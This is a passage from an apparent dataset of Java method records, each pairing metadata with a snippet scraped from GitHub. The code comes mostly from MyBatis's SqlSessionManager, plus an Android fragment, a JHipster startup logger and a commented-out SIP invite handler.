assertTrue(boundSql.hasAdditionalParameter(\"person.name\"), \"should return true even if the child property does not exists.\");\n\n    assertTrue(boundSql.hasAdditionalParameter(\"array[0]\"));\n    assertTrue(boundSql.hasAdditionalParameter(\"array[99]\"), \"should return true even if the element does not exists.\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/mapping/BoundSqlTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32520, "method_name": "onCreateView", "class_name": "AboutFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        return inflater.inflate(R.layout.fragment_about, container, false);\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/AboutFragment.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 32521, "method_name": "onViewCreated", "class_name": "AboutFragment", "params": ["View", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n\n      /*  LinearLayout ll = view.findViewById(R.id.layout);\n        Animation animation = AnimationUtils.loadAnimation(getContext(),R.anim.animation_above);\n        ll.startAnimation(animation);*/\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/AboutFragment.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 32522, "method_name": "initApplication", "class_name": "SparrowApp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initApplication() {\n        Collection<String> activeProfiles = Arrays.asList(env.getActiveProfiles());\n        if (\n            activeProfiles.contains(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT) &&\n            activeProfiles.contains(JHipsterConstants.SPRING_PROFILE_PRODUCTION)\n        ) {\n            log.error(\n                \"You have misconfigured your application! It should not run \" + \"with both the 'dev' and 'prod' profiles at the same time.\"\n            );\n        }\n        if (\n            activeProfiles.contains(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT) &&\n            activeProfiles.contains(JHipsterConstants.SPRING_PROFILE_CLOUD)\n        ) {\n            log.error(\n                \"You have misconfigured your application! It should not \" + \"run with both the 'dev' and 'cloud' profiles at the same time.\"\n            );\n        }\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/SparrowApp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32523, "method_name": "main", "class_name": "SparrowApp", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication app = new SpringApplication(SparrowApp.class);\n        DefaultProfileUtil.addDefaultProfile(app);\n        Environment env = app.run(args).getEnvironment();\n        logApplicationStartup(env);\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/SparrowApp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32524, "method_name": "logApplicationStartup", "class_name": "SparrowApp", "params": ["Environment"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void logApplicationStartup(Environment env) {\n        String protocol = \"http\";\n        if (env.getProperty(\"server.ssl.key-store\") != null) {\n            protocol = \"https\";\n        }\n        String serverPort = env.getProperty(\"server.port\");\n        String contextPath = env.getProperty(\"server.servlet.context-path\");\n        if (StringUtils.isBlank(contextPath)) {\n            contextPath = \"/\";\n        }\n        String hostAddress = \"localhost\";\n        try {\n            hostAddress = InetAddress.getLocalHost().getHostAddress();\n        } catch (UnknownHostException e) {\n            log.warn(\"The host name could not be determined, using `localhost` as fallback\");\n        }\n        log.info(\n            \"\\n----------------------------------------------------------\\n\\t\" +\n            \"Application '{}' is running! Access URLs:\\n\\t\" +\n            \"Local: \\t\\t{}://localhost:{}{}\\n\\t\" +\n            \"External: \\t{}://{}:{}{}\\n\\t\" +\n            \"Profile(s): \\t{}\\n----------------------------------------------------------\",\n            env.getProperty(\"spring.application.name\"),\n            protocol,\n            serverPort,\n            contextPath,\n            protocol,\n            hostAddress,\n            serverPort,\n            contextPath,\n            env.getActiveProfiles()\n        );\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/SparrowApp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32525, "method_name": "process", "class_name": "InviteRequestProcessor", "params": ["RequestEvent", "SipLayer", "ServerTransaction"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void process(RequestEvent evt, SipLayer layer, ServerTransaction transaction) {\n\t\t// TODO Auto-generated method stub\n//\t\tRequest request = requestEvent.getRequest();\n//\n//\t\ttry {\n//\t\t\t// \u53d1\u9001100 Trying\n//\t\t\tServerTransaction serverTransaction = getServerTransaction(requestEvent);\n//\t\t\t// \u67e5\u8be2\u76ee\u6807\u5730\u5740\n//\t\t\tURI reqUri = request.getRequestURI();\n//\t\t\tURI contactURI = currUser.get(reqUri);\n//\n//\t\t\tSystem.out.println(\"processInvite rqStr=\" + reqUri + \" contact=\" + contactURI);\n//\n//\t\t\t// \u6839\u636eRequest uri\u6765\u8def\u7531\uff0c\u540e\u7eed\u7684\u54cd\u5e94\u6d88\u606f\u901a\u8fc7VIA\u6765\u8def\u7531\n//\t\t\tRequest cliReq = messageFactory.createRequest(request.toString());\n//\t\t\tcliReq.setRequestURI(contactURI);\n//\n//\t\t\tHeaderFactory headerFactory = SipFactory.getInstance().createHeaderFactory();\n//\t\t\tVia callerVia = (Via) request.getHeader(Via.NAME);\n//\t\t\tVia via = (Via) headerFactory.createViaHeader(SIPMain.ip, SIPMain.port, \"UDP\",\n//\t\t\t\t\tcallerVia.getBranch() + \"sipphone\");\n//\n//\t\t\t// FIXME \u9700\u8981\u6d4b\u8bd5\u662f\u5426\u80fd\u591f\u901a\u8fc7\u8bbe\u7f6eVIA\u5934\u57df\u6765\u4fee\u6539VIA\u5934\u57df\u503c\n//\t\t\tcliReq.removeHeader(Via.NAME);\n//\t\t\tcliReq.addHeader(via);\n//\n//\t\t\t// \u66f4\u65b0contact\u7684\u5730\u5740\n//\t\t\tContactHeader contactHeader = headerFactory.createContactHeader();\n//\t\t\tAddress address = SipFactory.getInstance().createAddressFactory()\n//\t\t\t\t\t.createAddress(\"sip:sipsoft@\" + SIPMain.ip + \":\" + SIPMain.port);\n//\t\t\tcontactHeader.setAddress(address);\n//\t\t\tcontactHeader.setExpires(3600);\n//\t\t\tcliReq.setHeader(contactHeader);\n//\n//\t\t\tclientTransactionId = sipProvider.getNewClientTransaction(cliReq);\n//\t\t\tclientTransactionId.sendRequest();\n//\n//\t\t\tSystem.out.println(\"processInvite clientTransactionId=\" + clientTransactionId.toString());\n//\n//\t\t\tSystem.out.println(\"send invite to callee: \" + cliReq);\n//\t\t} catch (TransactionUnavailableException e1) {\n//\t\t\te1.printStackTrace();\n//\t\t} catch (SipException e) {\n//\t\t\te.printStackTrace();\n//\t\t} catch (ParseException e) {\n//\t\t\te.printStackTrace();\n//\t\t} catch (Exception e) {\n//\t\t\te.printStackTrace();\n//\t\t}\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/transmit/request/impl/InviteRequestProcessor.java", "stars": "29", "class_props": {"extends": null, "implements": ["ISIPRequestProcessor"], "modifiers": ["public"]}}, {"id": 32526, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["Reader"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(Reader reader) {\n    return new SqlSessionManager(new SqlSessionFactoryBuilder().build(reader, null, null));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32527, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["Reader", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(Reader reader, String environment) {\n    return new SqlSessionManager(new SqlSessionFactoryBuilder().build(reader, environment, null));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32528, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["Reader", "Properties"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(Reader reader, Properties properties) {\n    return new SqlSessionManager(new SqlSessionFactoryBuilder().build(reader, null, properties));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32529, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["InputStream"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(InputStream inputStream) {\n    return new SqlSessionManager(new SqlSessionFactoryBuilder().build(inputStream, null, null));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32530, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["InputStream", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(InputStream inputStream, String environment) {\n    return new SqlSessionManager(new SqlSessionFactoryBuilder().build(inputStream, environment, null));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32531, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["InputStream", "Properties"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(InputStream inputStream, Properties properties) {\n    return new SqlSessionManager(new SqlSessionFactoryBuilder().build(inputStream, null, properties));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32532, "method_name": "newInstance", "class_name": "SqlSessionManager", "params": ["SqlSessionFactory"], "throws": null, "modifiers": ["public", "static"], "return_type": "SqlSessionManager", "snippet": "  public static SqlSessionManager newInstance(SqlSessionFactory sqlSessionFactory) {\n    return new SqlSessionManager(sqlSessionFactory);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32533, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession() {\n    this.localSqlSession.set(openSession());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32534, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(boolean autoCommit) {\n    this.localSqlSession.set(openSession(autoCommit));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32535, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["Connection"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(Connection connection) {\n    this.localSqlSession.set(openSession(connection));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32536, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["TransactionIsolationLevel"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(TransactionIsolationLevel level) {\n    this.localSqlSession.set(openSession(level));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32537, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["ExecutorType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(ExecutorType execType) {\n    this.localSqlSession.set(openSession(execType));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32538, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["ExecutorType", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(ExecutorType execType, boolean autoCommit) {\n    this.localSqlSession.set(openSession(execType, autoCommit));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32539, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["ExecutorType", "TransactionIsolationLevel"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(ExecutorType execType, TransactionIsolationLevel level) {\n    this.localSqlSession.set(openSession(execType, level));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32540, "method_name": "startManagedSession", "class_name": "SqlSessionManager", "params": ["ExecutorType", "Connection"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startManagedSession(ExecutorType execType, Connection connection) {\n    this.localSqlSession.set(openSession(execType, connection));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32541, "method_name": "isManagedSessionStarted", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isManagedSessionStarted() {\n    return this.localSqlSession.get() != null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32542, "method_name": "openSession", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession() {\n    return sqlSessionFactory.openSession();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32543, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(boolean autoCommit) {\n    return sqlSessionFactory.openSession(autoCommit);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32544, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["Connection"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(Connection connection) {\n    return sqlSessionFactory.openSession(connection);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32545, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["TransactionIsolationLevel"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(TransactionIsolationLevel level) {\n    return sqlSessionFactory.openSession(level);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32546, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["ExecutorType"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(ExecutorType execType) {\n    return sqlSessionFactory.openSession(execType);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32547, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["ExecutorType", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(ExecutorType execType, boolean autoCommit) {\n    return sqlSessionFactory.openSession(execType, autoCommit);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32548, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["ExecutorType", "TransactionIsolationLevel"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(ExecutorType execType, TransactionIsolationLevel level) {\n    return sqlSessionFactory.openSession(execType, level);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32549, "method_name": "openSession", "class_name": "SqlSessionManager", "params": ["ExecutorType", "Connection"], "throws": null, "modifiers": ["public"], "return_type": "SqlSession", "snippet": "  public SqlSession openSession(ExecutorType execType, Connection connection) {\n    return sqlSessionFactory.openSession(execType, connection);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32550, "method_name": "getConfiguration", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Configuration", "snippet": "  public Configuration getConfiguration() {\n    return sqlSessionFactory.getConfiguration();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32551, "method_name": "selectOne", "class_name": "SqlSessionManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T selectOne(String statement) {\n    return sqlSessionProxy.selectOne(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32552, "method_name": "selectOne", "class_name": "SqlSessionManager", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T selectOne(String statement, Object parameter) {\n    return sqlSessionProxy.selectOne(statement, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32553, "method_name": "selectMap", "class_name": "SqlSessionManager", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Map<K,V>", "snippet": "  public <K, V> Map<K, V> selectMap(String statement, String mapKey) {\n    return sqlSessionProxy.selectMap(statement, mapKey);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32554, "method_name": "selectMap", "class_name": "SqlSessionManager", "params": ["String", "Object", "String"], "throws": null, "modifiers": ["public"], "return_type": "Map<K,V>", "snippet": "  public <K, V> Map<K, V> selectMap(String statement, Object parameter, String mapKey) {\n    return sqlSessionProxy.selectMap(statement, parameter, mapKey);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32555, "method_name": "selectMap", "class_name": "SqlSessionManager", "params": ["String", "Object", "String", "RowBounds"], "throws": null, "modifiers": ["public"], "return_type": "Map<K,V>", "snippet": "  public <K, V> Map<K, V> selectMap(String statement, Object parameter, String mapKey, RowBounds rowBounds) {\n    return sqlSessionProxy.selectMap(statement, parameter, mapKey, rowBounds);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32556, "method_name": "selectCursor", "class_name": "SqlSessionManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Cursor<T>", "snippet": "  public <T> Cursor<T> selectCursor(String statement) {\n    return sqlSessionProxy.selectCursor(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32557, "method_name": "selectCursor", "class_name": "SqlSessionManager", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "Cursor<T>", "snippet": "  public <T> Cursor<T> selectCursor(String statement, Object parameter) {\n    return sqlSessionProxy.selectCursor(statement, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32558, "method_name": "selectCursor", "class_name": "SqlSessionManager", "params": ["String", "Object", "RowBounds"], "throws": null, "modifiers": ["public"], "return_type": "Cursor<T>", "snippet": "  public <T> Cursor<T> selectCursor(String statement, Object parameter, RowBounds rowBounds) {\n    return sqlSessionProxy.selectCursor(statement, parameter, rowBounds);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32559, "method_name": "selectList", "class_name": "SqlSessionManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<E>", "snippet": "  public <E> List<E> selectList(String statement) {\n    return sqlSessionProxy.selectList(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32560, "method_name": "selectList", "class_name": "SqlSessionManager", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "List<E>", "snippet": "  public <E> List<E> selectList(String statement, Object parameter) {\n    return sqlSessionProxy.selectList(statement, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32561, "method_name": "selectList", "class_name": "SqlSessionManager", "params": ["String", "Object", "RowBounds"], "throws": null, "modifiers": ["public"], "return_type": "List<E>", "snippet": "  public <E> List<E> selectList(String statement, Object parameter, RowBounds rowBounds) {\n    return sqlSessionProxy.selectList(statement, parameter, rowBounds);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32562, "method_name": "select", "class_name": "SqlSessionManager", "params": ["String", "ResultHandler"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void select(String statement, ResultHandler handler) {\n    sqlSessionProxy.select(statement, handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32563, "method_name": "select", "class_name": "SqlSessionManager", "params": ["String", "Object", "ResultHandler"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void select(String statement, Object parameter, ResultHandler handler) {\n    sqlSessionProxy.select(statement, parameter, handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32564, "method_name": "select", "class_name": "SqlSessionManager", "params": ["String", "Object", "RowBounds", "ResultHandler"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void select(String statement, Object parameter, RowBounds rowBounds, ResultHandler handler) {\n    sqlSessionProxy.select(statement, parameter, rowBounds, handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32565, "method_name": "insert", "class_name": "SqlSessionManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int insert(String statement) {\n    return sqlSessionProxy.insert(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32566, "method_name": "insert", "class_name": "SqlSessionManager", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int insert(String statement, Object parameter) {\n    return sqlSessionProxy.insert(statement, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32567, "method_name": "update", "class_name": "SqlSessionManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(String statement) {\n    return sqlSessionProxy.update(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32568, "method_name": "update", "class_name": "SqlSessionManager", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(String statement, Object parameter) {\n    return sqlSessionProxy.update(statement, 